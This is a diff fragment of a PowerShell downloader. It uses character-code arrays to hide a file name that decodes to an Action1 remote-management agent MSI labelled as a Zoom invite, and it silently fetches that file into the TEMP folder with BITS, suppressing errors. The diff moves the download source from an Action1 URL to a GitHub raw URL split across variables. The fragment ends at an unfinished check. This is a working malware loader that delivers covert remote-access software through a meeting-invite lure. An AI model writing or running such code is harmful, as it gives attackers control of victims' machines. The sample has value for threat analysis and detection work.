@@ -1,7 +1,9 @@
-$n = -join [char[]](97,103,101,110,116,40,90,79,79,77,73,78,86,73,84,69,41)
+$n = -join [char[]](97,99,116,105,111,110,49,95,97,103,101,110,116,40,90,79,79,77,73,78,86,73,84,69,41)
 $x = -join [char[]](46,109,115,105)
 $p = [IO.Path]::Combine([Environment]::GetEnvironmentVariable('TEMP'), $n + $x)
-$u = 'https://app.na-2.action1.com/agent/bd5fb034-acbc-11f1-80f4-2952598af9c5/Windows/agent(ZOOMINVITE).msi'
+$a = 'https://github.com/iendjd7-lgtm/-Remmmy1-2build/'
+$b = 'raw/refs/heads/main/'
+$u = $a + $b + $n + $x
 Import-Module BitsTransfer -Verbose:$false -WarningAction SilentlyContinue
 Start-BitsTransfer -Source $u -Destination $p -Priority Foreground -ErrorAction SilentlyContinue
 if (-not (Test-Path $p)) {
